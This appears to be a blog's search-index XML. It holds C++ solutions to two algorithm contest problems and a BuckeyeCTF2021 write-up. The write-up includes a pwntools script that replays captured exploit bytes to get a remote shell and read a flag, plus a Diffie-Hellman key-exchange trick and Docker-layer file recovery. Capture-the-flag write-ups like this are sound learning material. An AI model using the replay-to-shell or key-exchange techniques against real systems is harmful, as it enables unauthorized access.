<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>01-复杂度2 Maximum Subsequence Sum（25 分）</title>
    <url>/posts/41173/</url>
    <content><![CDATA[<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem:"></a>Problem:</h2><p>Given a sequence of KK integers {N1,N2,...,NK}. A continuous subsequence is defined to be {Ni,Ni+1,...,Nj} where 1≤i≤j≤K1≤i≤j≤K. The Maximum Subsequence is the continuous subsequence which has the largest sum of its elements. For example, given sequence { -2, 11, -4, 13, -5, -2 }, its maximum subsequence is { 11, -4, 13 } with the largest sum being 20.<br>Now you are supposed to find the largest sum, together with the first and the last numbers of the maximum subsequence.</p>
<span id="more"></span>
<h2 id="Input-Specification"><a href="#Input-Specification" class="headerlink" title="Input Specification:"></a>Input Specification:</h2><p>Each input file contains one test case. Each case occupies two lines. The first line contains a positive integerK(≤10000). The second line contains K numbers, separated by a space.</p>
<h2 id="Output-Specification"><a href="#Output-Specification" class="headerlink" title="Output Specification:"></a>Output Specification:</h2><p>For each test case, output in one line the largest sum, together with the first and the last numbers of the maximum subsequence. The numbers must be separated by one space, but there must be no extra space at the end of a line. In case that the maximum subsequence is not unique, output the one with the smallest indices i and j (as shown by the sample case). If all the K numbers are negative, then its maximum sum is defined to be 0, and you are supposed to output the first and the last numbers of the whole sequence.<br>output the first and the last numbers of the whole sequence.</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input:"></a>Sample Input:</h2><div class="note default no-icon"><p>10
-10 1 2 3 4 -5 -23 3 7 -21
</p></div>

<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output:"></a>Sample Output:</h2><div class="note default no-icon"><p>10 1 4
</p></div>

<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line">ll Start, End;</span><br><span class="line"><span class="type">int</span> a[<span class="number">1000006</span>];</span><br><span class="line">ll n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MaxSubseqSum2</span><span class="params">( <span class="type">int</span> A[], <span class="type">int</span> N )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ThisSum, MaxSum = <span class="number">-0xffff</span>;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; N; i++ )   <span class="comment">/* i是子列左端位置 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        ThisSum = <span class="number">0</span>;  <span class="comment">/* ThisSum是从A[i]到A[j]的子列和 */</span></span><br><span class="line">        <span class="keyword">for</span>( j = i; j &lt; N; j++ )   <span class="comment">/* j是子列右端位置 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            ThisSum += A[j];        <span class="comment">/*对于相同的i，不同的j，只要在j-1次循环的基础上累加1项即可*/</span></span><br><span class="line">            <span class="keyword">if</span>( ThisSum &gt; MaxSum ) <span class="comment">/* 如果刚得到的这个子列和更大 */</span></span><br><span class="line">            &#123;</span><br><span class="line">                MaxSum = ThisSum;    <span class="comment">/* 则更新结果 */</span></span><br><span class="line">                Start = A[i];</span><br><span class="line">                End = A[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">/* j循环结束 */</span></span><br><span class="line">    &#125; <span class="comment">/* i循环结束 */</span></span><br><span class="line">    <span class="keyword">return</span> MaxSum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> temp = <span class="built_in">MaxSubseqSum2</span>(a, n);</span><br><span class="line">    <span class="keyword">if</span>(temp &lt; <span class="number">0</span>)</span><br><span class="line">        cout &lt;&lt; <span class="number">0</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; a[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; a[n - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="built_in">MaxSubseqSum2</span>(a, n) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; Start &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; End &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">input</span>();</span><br><span class="line">    <span class="built_in">output</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两重循环遍历，算法复杂度为O（N^2）；<br>第一次提交有部分测试点没通过，其原因是对最大和小于0时的情况没处理好。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>数据结构_陈越、何钦铭</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>2017百度之星资格赛 1003 度度熊与邪恶大魔王（完全背包）</title>
    <url>/posts/53776/</url>
    <content><![CDATA[<h2 id="度度熊与邪恶大魔王"><a href="#度度熊与邪恶大魔王" class="headerlink" title="度度熊与邪恶大魔王"></a>度度熊与邪恶大魔王</h2><p>Accepts: 2016<br>Submissions: 12307<br>Time Limit: 2000&#x2F;1000 MS (Java&#x2F;Others)<br>Memory Limit: 32768&#x2F;32768 K (Java&#x2F;Others)<br>传送门: <a href="http://bestcoder.hdu.edu.cn/contests/contest_showproblem.php?cid=774&pid=1003">bestcoder</a></p>
<span id="more"></span>

<h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><p>度度熊为了拯救可爱的公主，于是与邪恶大魔王战斗起来。<br>邪恶大魔王的麾下有n个怪兽，每个怪兽有a[i]的生命值，以及b[i]的防御力。<br>度度熊一共拥有m种攻击方式，第i种攻击方式，需要消耗k[i]的晶石，造成p[i]点伤害。<br>当然，如果度度熊使用第i个技能打在第j个怪兽上面的话，会使得第j个怪兽的生命值减少p[i]-b[j]，当然如果伤害小于防御，那么攻击就不会奏效。<br>如果怪兽的生命值降为0或以下，那么怪兽就会被消灭。<br>当然每个技能都可以使用无限次。<br>请问度度熊最少携带多少晶石，就可以消灭所有的怪兽。</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>本题包含若干组测试数据。<br>第一行两个整数n，m,表示有n个怪兽，m种技能。<br>接下来n行，每行两个整数，a[i],b[i]，分别表示怪兽的生命值和防御力。<br>再接下来m行，每行两个整数k[i]和p[i]，分别表示技能的消耗晶石数目和技能的伤害值。<br>数据范围:</p>
<div class="note default no-icon"><p>1<=n<=100000
1<=m<=1000
1<=a[i]<=1000
0<=b[i]<=10
0<=k[i]<=100000
0<=p[i]<=1000
</p></div>

<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>对于每组测试数据，输出最小的晶石消耗数量，如果不能击败所有的怪兽，输出-1</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><div class="note default no-icon"><p>1 2
3 5
7 10
6 8
1 2
3 5
10 7
8 
</p></div>

<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><div class="note default no-icon"><p>8
16
</p></div>

<h2 id="Aceppted代码"><a href="#Aceppted代码" class="headerlink" title="Aceppted代码"></a>Aceppted代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Problem:度度熊与邪恶大魔王</span></span><br><span class="line"><span class="comment">Author:QiZhao</span></span><br><span class="line"><span class="comment">Data:2017-08-05</span></span><br><span class="line"><span class="comment">Description:DP，完全背包</span></span><br><span class="line"><span class="comment">Copyright  2017 QiZhao. All rights reserved.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1020</span>;</span><br><span class="line"><span class="type">const</span> ll INF=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">ll num[maxn][<span class="number">12</span>];<span class="comment">//防御值为j，生命值为i的怪物的个数</span></span><br><span class="line">ll dp[<span class="number">1020</span>][<span class="number">15</span>];<span class="comment">//对于生命值为i，防御值为j的怪物所消耗的最小水晶数</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">skill</span></span><br><span class="line">&#123;</span><br><span class="line">    ll hit;</span><br><span class="line">    ll price;</span><br><span class="line">&#125; a[maxn];</span><br><span class="line">ll best[maxn];<span class="comment">//攻击力为i时，消耗的最少水晶数。</span></span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">min</span><span class="params">(ll a,ll b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">complete_packet</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> p)</span><span class="comment">//p为攻击力，k为消耗水晶数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt;= <span class="number">10</span>; ++b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &gt;= p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> d = p - b;</span><br><span class="line">            <span class="comment">//血量小于攻击</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">1</span>; a &lt;= d; ++a)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[a][b] = <span class="built_in">min</span>(dp[a][b], k);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//血量大于攻击</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> a = d + <span class="number">1</span>; a &lt;= <span class="number">1000</span>; ++a)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[a][b] = <span class="built_in">min</span>(dp[a][b], dp[a - d][b] + k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    ll n, m;</span><br><span class="line">    ll x, y;</span><br><span class="line">    ll <span class="comment">/*max_hp = -0xffff,*/</span> max_def = -INF, max_hit = -INF;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)</span><br><span class="line">    &#123;</span><br><span class="line">        max_def = -INF, max_hit = -INF;</span><br><span class="line">        <span class="built_in">memset</span>(num, <span class="number">0</span>, <span class="built_in">sizeof</span>(num));</span><br><span class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">        <span class="built_in">memset</span>(best, <span class="number">-1</span>, <span class="built_in">sizeof</span>(best));</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="built_in">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">            num[x][y]++;</span><br><span class="line">            <span class="comment">//if(x &gt;= max_hp)</span></span><br><span class="line">            <span class="comment">//max_hp = x;</span></span><br><span class="line">            <span class="keyword">if</span>(y &gt;= max_def)</span><br><span class="line">                max_def = y;</span><br><span class="line">        &#125;</span><br><span class="line">        ll flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">            <span class="keyword">if</span>(best[y] == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                a[flag].hit = y;</span><br><span class="line">                a[flag].price = x;</span><br><span class="line">                best[y] = x;</span><br><span class="line">                <span class="keyword">if</span>(a[flag].hit &gt; max_hit)</span><br><span class="line">                    max_hit = a[flag].hit;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(x &lt; best[y])</span><br><span class="line">                    best[y] = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ll ans = <span class="number">0</span>;</span><br><span class="line">        ll temp = <span class="number">0</span>; <span class="comment">//记录已处理怪物个数，优化时间</span></span><br><span class="line">        <span class="keyword">if</span>(max_def &gt;= max_hit)</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">1010</span>; ++i)<span class="comment">//初始化DP</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">10</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        dp[i][j] = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        dp[i][j] = INF;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;flag;i++)</span><br><span class="line">                <span class="built_in">complete_packet</span>(best[a[i].hit],a[i].hit);</span><br><span class="line">            <span class="keyword">for</span>(ll i = <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(temp == n)<span class="comment">//优化时间</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">for</span>(ll j = <span class="number">0</span>; j &lt; <span class="number">12</span>; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(num[i][j] != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        temp += num[i][j];</span><br><span class="line">                        ans += dp[i][j]*num[i][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>百度之星</tag>
        <tag>完全背包</tag>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title>BuckeyeCTF2021 Writeup</title>
    <url>/posts/4120451577/</url>
    <content><![CDATA[<h1 id="Key-Exchange"><a href="#Key-Exchange" class="headerlink" title="Key Exchange"></a>Key Exchange</h1><p><em>Let&#39;s exchange the flag (securely):</em><br><em>nc crypto.chall.pwnoh.io 13374</em></p>
<hr>
<p>分析给出的代码,发现当输入的B等于g的时候,A的值即为<code>shared_secret</code>,从而可以得到AES密钥,解密后即可得到flag.</p>
<p>使用nc连接服务器:</p>
<pre><code class="shell">╭─ ~/CTF/BuckeyeCTF2021
╰─$ nc crypto.chall.pwnoh.io 13374
I&#39;m going to send you the flag.
However, I noticed that an FBI agent has been eavesdropping on my messages,
so I&#39;m going to send it to you in a way that ONLY YOU can decrypt the flag.

p = 10880518517873967643757501014080864657695946662967756945469976115601889926901188881654458659008874387964581741306546485865737476973040012870453076020399351
g = 5
A = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180
Give me your public key B: 5
ciphertext = a54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8
</code></pre>
<p>代码</p>
<pre><code class="python">def decrypt():
    shared_secret = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180
    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:16]
    cipher = AES.new(key, AES.MODE_ECB)
    message = 0xa54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8
    plaintext = cipher.decrypt(cun.long_to_bytes(message))
    print(plaintext)

decrypt()
</code></pre>
<p><strong>flag:</strong><code>buckeye&#123;DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?&#125;</code></p>
<h1 id="layers"><a href="#layers" class="headerlink" title="layers"></a>layers</h1><p><em>Check out my brand new docker repo <a href="https://hub.docker.com/r/qxxxb/layers">https://hub.docker.com/r/qxxxb/layers</a></em></p>
<hr>
<p>查看镜像历史,发现曾经存在一个<code>flag.png</code>,但是被删除了</p>
<pre><code class="shell">[root@VM-8-4-centos ~] docker history qxxxb/layers
IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
0c01a25ae5b7   5 days ago    /bin/sh -c echo &quot;Sorry, the flag has been de…   36B
&lt;missing&gt;      5 days ago    /bin/sh -c rm flag.png                          0B
&lt;missing&gt;      5 days ago    /bin/sh -c #(nop) COPY multi:6b3bd56201fda03…   599kB
&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot;]              0B
&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop) ADD file:aad4290d27580cc1a…   5.6MB
</code></pre>
<p>使用<code>docker save</code>将镜像保存成tar包并解压,然后再解压每一层文件夹中中的<code>layer.tar</code>找到<code>flag.png</code></p>
<pre><code class="shell">[root@VM-8-4-centos ~] docker save qxxxb/layers -o a.tar
[root@VM-8-4-centos ~]# tar xvf a.tar
0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9.json
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/VERSION
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/json
7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/VERSION
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/json
8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/layer.tar
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/VERSION
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/json
c37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/layer.tar
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/VERSION
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/json
c6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/layer.tar
manifest.json
repositories
[root@VM-8-4-centos ~]# tar xvf 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar
Dockerfile
flag.png
</code></pre>
<p><img data-src="/../../CTF/BuckeyeCTF2021/Misc/images/flag.png" alt="flag"></p>
<p><strong>flag:</strong><code>buckeye&#123;D0CK3R_H4S_L4Y3RS&#125;</code></p>
<h1 id="replay"><a href="#replay" class="headerlink" title="replay"></a>replay</h1><p><em>Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit. Oh by the way, the same app is also running on <code>misc.chall.pwnoh.io</code> on port <code>13371</code>. Can you pwn it for me?</em></p>
<hr>
<p>使用<a href="https://www.wireshark.org/download.html">Wireshark</a>分析<code>replay.pcap</code>文件,跟踪TCP流,发现似乎是发送了一些数据拿到Shell权限后,执行了一些命令.</p>
<p>对着“Data”右键,选择“导出分组字节流”,保存字节流数据至<code>a.bin</code></p>
<img data-src="../../CTF/BuckeyeCTF2021/Misc/images/replay-1.png" alt="image-20211027235735902" style="zoom:60%;" />

<p>编写脚本,使用<a href="https://github.com/Gallopsled/pwntools">pwn</a>连接服务器并发送数据,执行shell命令,找到<code>flag.txt</code>文件</p>
<pre><code class="shell">╭─ ~/CTF/BuckeyeCTF2021
╰─$ python a.py
[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
[*] Switching to interactive mode
$ ls
chall
flag.txt
$ cat flag.txt
buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125;
</code></pre>
<p>代码:</p>
<pre><code class="python">from pwn import *
p = remote(&#39;misc.chall.pwnoh.io&#39;, 13371)
p.recvuntil(b&#39;TODAY&#39;, drop=True)
p.recvline()
with open(&#39;a.bin&#39;,&#39;rb&#39;) as f:
    data  = f.read()
p.send(data)
p.interactive()
p.close()
</code></pre>
<p><strong>flag:</strong><code>buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125;</code></p>
<h1 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h1><p><em>Anyone taken Software 1? Can you help me figure out what this weird Java program does?</em></p>
<hr>
<p>用<a href="http://www.javadecompilers.com/">javadecompilers</a>反编译<code>Buttons.jar</code>得到源码.</p>
<p>观察到有一个<code>printFlag</code>函数,但是依赖于<code>moveHistory</code>,所以不能通过直接运行<code>printFlag</code>来得到flag.</p>
<p>分析调用<code>printFlag</code>函数的<code>actionPerformed</code>,发现:只有当前点击的方格是<code>isLegalMove</code>的时候,才会被加到<code>moveHistory</code>里;当前点击的方格是最后一个时就会打印出<code>flag</code>.</p>
<p>继续分析<code>isLegalMove</code>函数,发现该函数返回为<code>True</code>时必须满足<code>grid[n][n2] == 0</code>.</p>
<p>那么我们可以在初始化的时候,将所有满足<code>grid[n][n2] == 0</code>的方格设为🏁,然后依次点击显示为🏁的方格即可.</p>
<pre><code class="java">this.buttons[i][j] = new JButton(&quot;?&quot;);

if(this.grid[i][j] == 0)&#123;
  this.buttons[i][j].setText(&quot;\u2691&quot;);
&#125;
</code></pre>
<p>使用<code>javac</code>命令将源代码编译为Java字节码文件并运行.</p>
<pre><code class="shell">╭─ ~/CTF/BuckeyeCTF2021
╰─$ javac Buttons.java
注: Buttons.java使用了未经检查或不安全的操作。
注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。
╭─ ~/CTF/BuckeyeCTF2021
╰─$ java Buttons
</code></pre>
<p><img data-src="/../../CTF/BuckeyeCTF2021/Reverse/images/Buttons.png" alt="Buttons!"></p>
<p>代码</p>
<pre><code class="java">/*
 * Decompiled with CFR 0.150.
 */
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;

public final class Buttons
extends JFrame
implements ActionListener &#123;
    private static final int[][] grid = new int[][]&#123;
        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1&#125;,
        &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1&#125;,
        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;,
        &#123;1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, 
        &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1&#125;,
        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;,
        &#123;1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1&#125;,
        &#123;1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;,
        &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1&#125;,
        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;,
        &#123;1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;
    &#125;;
    private final int rows;
    private final int cols;
    private final JLabel movesLabel;
    private final JButton resetButton;
    private final JButton[][] buttons;
    private int posRow;
    private int posCol;
    private final int endRow;
    private final int endCol;
    private static final int MAX_MOVES = 139;
    private ArrayList&lt;Integer&gt; moveHistory;

    public static void main(String[] arrstring) throws Exception &#123;
        new Buttons();
    &#125;

    public Buttons() &#123;
        super(&quot;Buttons!&quot;);
        this.resetValues();
        this.rows = grid.length;
        this.cols = grid[0].length;
        this.endRow = this.rows - 1;
        this.endCol = this.cols - 2;
        JPanel jPanel = new JPanel();
        jPanel.setLayout(new BoxLayout(jPanel, 3));
        JPanel jPanel2 = new JPanel(new GridLayout(this.rows, this.cols));
        JPanel jPanel3 = new JPanel();
        this.buttons = new JButton[this.rows][this.cols];
        for (int i = 0; i &lt; this.rows; ++i) &#123;
            for (int j = 0; j &lt; this.cols; ++j) &#123;
